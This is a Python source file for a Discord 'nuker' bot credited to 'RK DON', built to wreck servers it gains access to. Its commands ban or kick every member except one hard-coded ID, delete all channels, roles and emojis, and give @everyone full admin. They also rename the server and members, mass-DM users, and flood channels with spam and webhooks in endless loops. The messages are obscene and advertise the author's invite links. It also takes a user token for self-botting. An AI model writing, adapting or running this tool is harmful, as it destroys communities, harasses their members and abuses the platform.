import discord
import asyncio
import colorama
import json
from discord.ext import commands
import os
import random
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions
import requests
from colorama import Fore, Style
import time
from keep_alive import keep_alive
import traceback
import discord

print(f"""{Fore.RED} [LOADING] \33[31m╭╮╱╭╮╱╱╭╮""")
time.sleep(1)
print(f"""{Fore.RED} [LOADING] \33[34m┃┃╱┃┃╱╱┃┃""")
time.sleep(1)
print(f"""{Fore.RED} [LOADING] \33[31m┃┃╱┃┣━╮┃┃╭┳━╮╭━━┳╮╭╮╭┳━╮""")
time.sleep(1)
print(f"""{Fore.RED} [LOADING] \33[34m┃┃ |┃╭╮┫╰╯┫╭╮┫╭╮┃╰╯╰╯┃╭╮╮""")
time.sleep(1)
print(f"""{Fore.RED} [LOADING] \33[31m┃╰━╯┃┃┃┃╭╮┫┃┃┃╰╯┣╮╭╮╭┫┃┃┃""")
time.sleep(1)
print(f"""{Fore.GREEN} [LOADED!]\33[34m╰━━━┻╯╰┻╯╰┻╯╰┻━━╯╰╯╰╯╰╯╰╯""")

input_var = input(f"""{Fore.RED}PRE{Fore.BLUE}FIX: """)
prefix = (input_var)

input_var2 = input(f"""{Fore.RED}TO{Fore.BLUE}KEN: """)
token = (input_var2)
input_var3 = input(f"""{Fore.RED}BOT{Fore.BLUE} [True / False] : """)
BT = (input_var3)
client = commands.Bot(command_prefix=(prefix), intents=discord.Intents.all())

STATUS = "to q!setup|q!help"

CHANNEL_NAMES = [
    "Your Mom Cooked", "DESTROYED", "rk.nuker", "i love your mom", "MISS YOU",
    "LOVE FROM RK", "STEP MOM FUCKED", "STEP SISTER FUCKED",
    "SERVER DESTROYED", "MUMMY FUCKED UP"
]
MESSAGE_CONTENTS = [
    "@everyone Join this Server Other Next will be your Server: https://discord.gg/bcjrk4Q3np",
    "@everyone This Server is gone", "@everyone GIFTED BY RK"
]
WEBHOOK_NAMES = ['FUCKED', 'TIMELINES', 'SERVER GONE', 'COOKED']

ROLES = ['SERVER COOKED', 'FUCKED BY DADDY', 'EVERYONE DADDY', 'RK SAYS FUCK YOU']

SERVER_NAME = "FUCKED BY 😉👀😎"

BAN_REASON = [
    'Daddy', 'YOU R NOT ALLOWED', 'Daddy BANNED YOU', 'Daddy SAYS FUCK YOU'
]

CATEGORY = ['STEP MOM XXX', 'PORN HUB', 'BRO GOT NUKED', 'NEVER TRUST', 'LOL']

client.remove_command('help')


@client.command()
async def ban(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != 983946996354252830:
            for user in list(ctx.guild.members):
                try:
                    await ctx.guild.ban(user)
                    print(f"{user.name} Was Banned")
                except:
                    pass


@client.command()
async def dmall(ctx, *, message: str):
    await ctx.message.delete()
    for channel in client.private_channels:
        try:
            await channel.send(f"{message}")
            print("Message Sent To {channel}")
        except:
            print("Message Not Sent To {channel}")


@client.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        if role.name == '@everyone':
            try:
                await role.edit(permissions=Permissions.all())
                print("@everyone has admin")
            except:
                print("Failed to give everyone admin")


@client.event
async def on_connect():
    await client.change_presence(activity=discord.Game(name=(STATUS)))


time.sleep(1)
print(f"""
{Fore.GREEN}\n\nLogged In successfully {Fore.GREEN}\n Prefix is: {Fore.BLUE} {prefix}{Fore.BLUE}\n\n{Fore.WHITE}---------MADE BY RK DON---------------{Fore.RED}\n\n{Fore.BLUE}{Fore.YELLOW}∆ {Fore.GREEN}RK DON'S nuking Bot V 3.0, {Fore.WHITE}\n\n---------------------------------------"""
      )


@client.command(pass_context=True)
async def name(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command(pass_context=True)
async def emojidel(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")


@client.command()
async def roles(ctx):
    await ctx.message.delete()
    for i in range(1, 250):
        try:
            await ctx.guild.create_role(name=random.choice(ROLES))
            print("Created Roles")
        except:
            print("Failed To Create Role")


@client.command()
async def category(ctx):
    await ctx.message.delete()
    for i in range(1, 250):
        try:
            await ctx.guild.create_category(name=random.choice(CATEGORY))
            print("Created Category")
        except:
            print("Failed To Create category")


@client.command()
async def channels(ctx):
    await ctx.message.delete()
    for i in range(1, 250):
        try:
            await ctx.guild.create_text_channel(
                name=random.choice(CHANNEL_NAMES))
            print("Created Channel")
        except:
            print("Failed To Create channel")


@client.command()
async def vc(ctx):
    await ctx.message.delete()
    for i in range(1, 250):
        try:
            await ctx.guild.create_voice_channel(
                name=random.choice(CHANNEL_NAMES))
            print("Created Channel")
        except:
            print("Failed To Create channel")


@client.command()
async def wizz(ctx, amount=50):
    await ctx.guild.edit(name=(SERVER_NAME))
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(channel.name + " Has been wizzed")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
            print(f"[{i}] channels made")
        except:
            print("error making channels")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"{role.name} deleted")
        except:
            print(f"{role.name} not deleted")
    await asyncio.sleep(2)
    for i in range(100):
        for i in range(1000):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(random.choice(MESSAGE_CONTENTS))
                    print(f"{channel.name} spammed")
                except:
                    print(f"{channel.name} not spammed")
        for member in ctx.guild.members:
            if member.id != 983946996354252830:
                try:
                    await member.ban(reason=random.choice(BAN_REASON))
                    print(f"{member.name} banned from {ctx.guild.name}")
                except:
                    print(f"{member.name} not banned from {ctx.guild.name}")


@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
    while True:
        await channel.send(random.choice(MESSAGE_CONTENTS))
        await webhook.send(random.choice(MESSAGE_CONTENTS),
                           username=random.choice(WEBHOOK_NAMES))


@client.command()
async def kick(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick(reason=random.choice(BAN_REASON))
            print(member.name + "Has Been Kicked")
        except:
            print(member.name + "Has Not Been Kicked")


@client.command()
async def status(ctx, *, x):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Streaming(name=x, url="https://discord.gg/bcjrk4Q3np")
    )


@client.command(pass_context=True)
async def nick(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print(f"{member.name} has been renamed to {rename_to}")
        except:
            print(f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")


@client.command()
async def stop(ctx):
    await ctx.reply('> **Logged Out | Shut down successfully**')
    await client.close()


@client.command()
async def delall(ctx):
    # LOL
    print('Deleting all...')

    print('Deleting channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")

    print('Deleting roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")

    print('Deleting emojis..')
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")

    print("Action Completed: dall all")


@client.command()
async def editall(ctx, *, x):
    # LOL
    print('Renaming all...')

    print('Renaming channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=x)
        except discord.Forbidden:
            print(f"{channel.name} has NOT been edited in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been edited in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been edited in {ctx.guild.name}")

    print('Renaming roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.edit(name=x)
        except discord.Forbidden:
            print(f"{role.name} has NOT been edited in {ctx.guild.name}")
        else:
            print(f"{role.name} has been edited in {ctx.guild.name}")

    print("Action Completed: dall all")


@client.command(pass_context=True)
async def channeldel(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")


@client.command(pass_context=True)
async def roledel(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{role.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")


@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed = discord.Embed(title=None,
                          description='Ping: {}'.format(round(
                              (t2 - t1) * 1000)),
                          color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: Server ping")


#############################


####INFO COMMAND####
@client.command(pass_context=True)
async def userinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send(
            "**The user's name is: {}**".format(member.name) +
            "\n**The user's ID is: {}**".format(member.id) +
            "\n**The user's current status is: {}**".format(member.status) +
            "\n**The user's highest role is: {}**".format(member.top_role) +
            "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")


#############################
@client.command('role')
async def role(ctx, user: discord.Member, *, role: discord.Role):
    await ctx.message.delete()
    if role in user.roles:
        await user.remove_roles(role)  #removes the role if user already has
        await ctx.send(f"Removed {role} from {user.mention}")
    else:
        await user.add_roles(role)  #adds role if not already has it
        await ctx.send(f"Added {role} to {user.mention}")


@client.command()
async def serverroles(ctx, *args):
    guild = ctx.guild
    roles = [role for role in guild.roles if role != ctx.guild.default_role]
    embed = discord.Embed(title="Server Roles",
                          description=f"\n ".join(
                              [role.mention for role in roles]))
    await ctx.send(embed=embed)


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    await ctx.send(
        '** 📬 | PLS CHECK YOUR DM. `If you didnt get anything try again after opening you dm`**'
    )
    retStr = str(
        "```fix\n❄️wizz - nukes server\n\nban - banall (non threaded)\n\nkick - kickall\n\nroles - spams roles\n\nemojidel - deletes emojis\n\ndmall - dms everyone in guild\n\nname - changes guild name\n\nadmin - gives all admin\n\ncategory - Create categories\n\nchannels - create channels\n\nvc - create voice channels\n\nstatus [name] - change the status to the given object\n\nnick [name] - rename everyone in the server\n\nstop - stop the process\n\nroledel - Delete all roles\n\nchanneldel - Delete all channels\n\server - show server info\n\ndelall - delete all channels, emojis, roles\n\nping - show the bot's ping in ms\n\nuserinfo [username/Id] - show info of the user\n\server - shows server's info\n\nrole [Username/ID] [Role/ID] - give role to the specific user (permissions No need)\n\neditall [name] - Rename all channels and Roles\n\nserverroles - show all server roles ```"
        "")
    embed = discord.Embed(
        color=0xfffafa,
        title="Discord Nuker By RK, Click on me to Join Server",
        url='https://discord.gg/Kfk8anhe4T')
    embed.add_field(name="Help Panel", value=retStr)
    embed.set_footer(text='create by RK DON')

    await ctx.author.send(embed=embed)


@client.command()
async def server(ctx):
    embed = discord.Embed(title=f"{ctx.guild.name} Info",
                          description="Information of this Server",
                          color=discord.Colour.blue())
    embed.add_field(name='🆔Server ID', value=f"{ctx.guild.id}", inline=True)
    embed.add_field(name='📆Created On',
                    value=ctx.guild.created_at.strftime("%b %d %Y"),
                    inline=True)
    embed.add_field(name='👑Owner',
                    value=f"{ctx.guild.owner.mention}",
                    inline=True)
    embed.add_field(name='👥Members',
                    value=f'{ctx.guild.member_count} Members',
                    inline=True)
    embed.add_field(
        name='💬Channels',
        value=
        f'{len(ctx.guild.text_channels)} Text | {len(ctx.guild.voice_channels)} Voice',
        inline=True)
    embed.add_field(name='🌎Region', value=f'{ctx.guild.region}', inline=True)
    embed.set_thumbnail(url=ctx.guild.icon_url)
    embed.set_footer(text="RK DON")

    await ctx.send(embed=embed)


keep_alive()
client.run(token, bot=BT)
